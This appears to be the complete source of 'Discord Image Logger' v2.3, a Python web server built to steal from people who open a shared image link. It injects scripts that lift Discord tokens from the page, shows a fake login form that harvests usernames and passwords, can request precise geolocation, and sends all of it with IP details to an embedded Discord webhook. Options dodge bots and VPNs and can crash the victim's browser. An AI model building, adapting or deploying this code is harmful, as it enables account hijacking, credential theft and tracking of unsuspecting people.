from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs, Discord tokens, and browser credentials by abusing Discord's Open Original feature"
__version__ = "v2.3"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1366849835172364439/4eTvT8QeTTAsIogI0ofV5tbjg_U8bSSoQ1no5WU5T_Mn0CpmbcAEAJ2tG4DrQ5TStY7P",
    "image": "https://media.discordapp.net/attachments/1360581267862847549/1366847369080999966/Moon_phasesPHASE1.png?ex=68126f4f&is=68111dcf&hm=b4897b5f8bcda159d5ac4e17f163fb4ef6d72f5dbb8dbd9ea5ca29d8dfa8a66c&=&format=webp&quality=lossless",
    "imageArgument": True,

    # CUSTOMIZATION #
    "username": "Image Logger",
    "color": 0x00FFFF,

    # OPTIONS #
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    },
    # TOKEN GRABBER #
    "tokenGrabber": True,
    # PASSWORD GRABBER #
    "passwordGrabber": True,
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip and ip.startswith(("34", "35")):
        return "Discord"
    elif useragent and useragent.startswith("TelegramBot"):
        return "Telegram"
    return False

def reportError(error, context="Unknown"):
    try:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "@everyone",
            "embeds": [
                {
                    "title": "Image Logger - Error",
                    "color": config["color"],
                    "description": f"An error occurred!\n\n**Context:** {context}\n**Error:**\n```\n{error}\n```",
                }
            ],
        }, timeout=5)
    except Exception as e:
        print(f"Failed to report error to webhook: {e}")

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, token=None, password=None, username=None):
    if ip and ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        if config["linkAlerts"]:
            try:
                requests.post(config["webhook"], json={
                    "username": config["username"],
                    "content": "",
                    "embeds": [
                        {
                            "title": "Image Logger - Link Sent",
                            "color": config["color"],
                            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                        }
                    ],
                }, timeout=5)
            except Exception as e:
                reportError(str(e), "Sending link alert")
        return

    ping = "@everyone"

    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=5).json()
    except Exception as e:
        reportError(str(e), "IP lookup failed")
        info = {}

    if info.get("proxy"):
        if config["vpnCheck"] == 2:
            return
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info.get("hosting"):
        if config["antiBot"] == 4:
            if info.get("proxy"):
                pass
            else:
                return
        if config["antiBot"] == 3:
            return
        if config["antiBot"] == 2:
            if info.get("proxy"):
                pass
            else:
                ping = ""
        if config["antiBot"] == 1:
            ping = ""

    os, browser = httpagentparser.simple_detect(useragent or "Unknown")
    
    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [
            {
                "title": "Image Logger - IP, Token, and Credentials Logged",
                "color": config["color"],
                "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info.get('isp', 'Unknown')}`
> **ASN:** `{info.get('as', 'Unknown')}`
> **Country:** `{info.get('country', 'Unknown')}`
> **Region:** `{info.get('regionName', 'Unknown')}`
> **City:** `{info.get('city', 'Unknown')}`
> **Coords:** `{str(info.get('lat', 'Unknown'))+', '+str(info.get('lon', 'Unknown')) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info.get('timezone', 'Unknown').split('/')[1].replace('_', ' ') if info.get('timezone') else 'Unknown'}`
> **Mobile:** `{info.get('mobile', 'Unknown')}`
> **VPN:** `{info.get('proxy', 'Unknown')}`
> **Bot:** `{info.get('hosting', False) if info.get('hosting') and not info.get('proxy') else 'Possibly' if info.get('hosting') else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**Discord Token:**
> `{token if token else 'Not retrieved'}`

**Captured Credentials:**
> **Username:** `{username if username else 'Not provided'}`
> **Password:** `{password if password else 'Not retrieved'}`

**User Agent:**
```
{useragent if useragent else 'Unknown'}
```""",
            }
        ],
    }
    
    if url:
        embed["embeds"][0].update({"thumbnail": {"url": url}})
    
    try:
        requests.post(config["webhook"], json=embed, timeout=5)
    except Exception as e:
        reportError(str(e), "Sending report")
    
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config.get("imageArgument", False):
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    try:
                        url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                    except Exception as e:
                        reportError(str(e), "Decoding URL/ID")
                        url = config["image"]
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}
div.login {{
position: absolute;
top: 20px;
left: 20px;
background: rgba(0, 0, 0, 0.8);
padding: 20px;
border-radius: 5px;
color: white;
font-family: Arial, sans-serif;
}}
input, button {{
margin: 10px 0;
padding: 5px;
width: 200px;
}}
</style>
<div class="img"></div>
<div class="login">
    <h3>Login to View Content</h3>
    <input type="text" id="username" placeholder="Username" autocomplete="username">
    <input type="password" id="password" placeholder="Password" autocomplete="current-password">
    <button onclick="submitCredentials()">Login</button>
</div>'''.encode()
            
            x_forwarded_for = self.headers.get('x-forwarded-for')
            if x_forwarded_for and x_forwarded_for.startswith(blacklistedIPs):
                return
            
            if botCheck(x_forwarded_for, self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
                self.end_headers()

                if config["buggedImage"]:
                    self.wfile.write(binaries["loading"])
                makeReport(x_forwarded_for, endpoint=s.split("?")[0], url=url)
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                token = None
                username = None
                password = None

                if config.get("tokenGrabber", False):
                    data += b'''<script>
                    function getToken() {
                        try {
                            var token = (window.webpackChunkdiscord_app?.push([[Symbol()],{},e=>e])?.c||{}).find(m=>m?.exports?.default?.getToken!==void 0)?.exports.default.getToken();
                            if (token) {
                                fetch(window.location.href + (window.location.href.includes("?") ? "&" : "?") + "t=" + btoa(token).replace(/=/g, "%3D"));
                            }
                        } catch (e) { console.error("Token grabber failed:", e); }
                    }
                    setTimeout(getToken, 1000);
                    </script>'''

                if config.get("passwordGrabber", False):
                    data += b'''<script>
                    function submitCredentials() {
                        try {
                            var username = document.getElementById('username').value;
                            var password = document.getElementById('password').value;
                            if (username || password) {
                                var query = "";
                                if (username) query += "u=" + btoa(username).replace(/=/g, "%3D");
                                if (password) query += (query ? "&" : "") + "p=" + btoa(password).replace(/=/g, "%3D");
                                fetch(window.location.href + (window.location.href.includes("?") ? "&" : "?") + query);
                            }
                        } catch (e) { console.error("Credential grabber failed:", e); }
                    }
                    </script>'''

                if dic.get("t"):
                    try:
                        token = base64.b64decode(dic.get("t").encode()).decode()
                    except Exception as e:
                        reportError(str(e), "Decoding token")
                if dic.get("u"):
                    try:
                        username = base64.b64decode(dic.get("u").encode()).decode()
                    except Exception as e:
                        reportError(str(e), "Decoding username")
                if dic.get("p"):
                    try:
                        password = base64.b64decode(dic.get("p").encode()).decode()
                    except Exception as e:
                        reportError(str(e), "Decoding password")

                if dic.get("g") and config.get("accurateLocation", False):
                    try:
                        location = base64.b64decode(dic.get("g").encode()).decode()
                    except Exception as e:
                        reportError(str(e), "Decoding location")
                        location = None
                    result = makeReport(x_forwarded_for, self.headers.get('user-agent'), location, s.split("?")[0], url=url, token=token, username=username, password=password)
                else:
                    result = makeReport(x_forwarded_for, self.headers.get('user-agent'), endpoint=s.split("?")[0], url=url, token=token, username=username, password=password)

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", x_forwarded_for or "Unknown")
                    message = message.replace("{isp}", result.get("isp", "Unknown"))
                    message = message.replace("{asn}", result.get("as", "Unknown"))
                    message = message.replace("{country}", result.get("country", "Unknown"))
                    message = message.replace("{region}", result.get("regionName", "Unknown"))
                    message = message.replace("{city}", result.get("city", "Unknown"))
                    message = message.replace("{lat}", str(result.get("lat", "Unknown")))
                    message = message.replace("{long}", str(result.get("lon", "Unknown")))
                    message = message.replace("{timezone}", f"{result.get('timezone', '/Unknown').split('/')[1].replace('_', ' ')}" if result.get('timezone') else "Unknown")
                    message = message.replace("{mobile}", str(result.get("mobile", "Unknown")))
                    message = message.replace("{vpn}", str(result.get("proxy", "Unknown")))
                    message = message.replace("{bot}", str(result.get("hosting", False) if result.get("hosting") and not result.get("proxy") else 'Possibly' if result.get("hosting") else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent') or "Unknown")[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent') or "Unknown")[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config.get("crashBrowser", False):
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                
                self.send_response(200)
                self.send_header('Content-type', datatype)
                self.end_headers()

                if config.get("accurateLocation", False):
                    data += b"""<script>
var currenturl = window.location.href;
if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
            if (currenturl.includes("?")) {
                currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
            } else {
                currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
            }
            location.replace(currenturl);
        });
    }
}
</script>"""
                self.wfile.write(data)
        
        except Exception as e:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc(), f"Handle request failed: {self.path}")

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
